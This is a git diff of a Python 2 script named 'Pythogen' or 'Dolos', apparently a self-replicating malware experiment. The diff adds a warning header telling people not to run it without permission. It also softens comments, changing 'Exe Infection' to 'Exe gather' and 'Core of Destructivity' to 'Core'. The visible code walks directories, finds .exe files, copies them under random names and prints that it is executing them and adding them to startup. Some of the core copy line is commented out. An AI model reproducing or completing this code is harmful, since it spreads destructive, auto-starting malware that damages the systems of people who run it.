@@ -1,7 +1,12 @@
 # Pythogen
 # 4/24/2016
 
-# Dolos
+# Dolos -
+
+# Experimental purposes. Don't execute unless you know
+# what this is.
+
+# Don't execute on anyone else's computer without permission!
 
 import os
 import subprocess
@@ -76,7 +81,7 @@ def crawl(dlet):
 		for (paths, dirs, files) in os.walk(folder):
     			for file in files:
     				if i==1:
-    				# Exe Infection
+    				# Exe gather
         				if file.endswith(".exe"):
         					# sworb contains the randomly generated new file names to be copied.
         					sworb = randint(0,9999)
@@ -87,7 +92,7 @@ def crawl(dlet):
         					print os.path.join(paths, ('%s.exe') % str(sworb))
         					print "\nExecuting and adding to startup..\n"
 
-        					# Core of Destructivity (De-highlight Four Lines)
+        					# Core (De-highlight Four Lines)
         					
         					# Line 1 (Rapidly Copy exe files > Randomize file names):
         					# copyfile(os.path.join(paths, file), os.path.join(paths, '%s.exe'% str(sworb)))
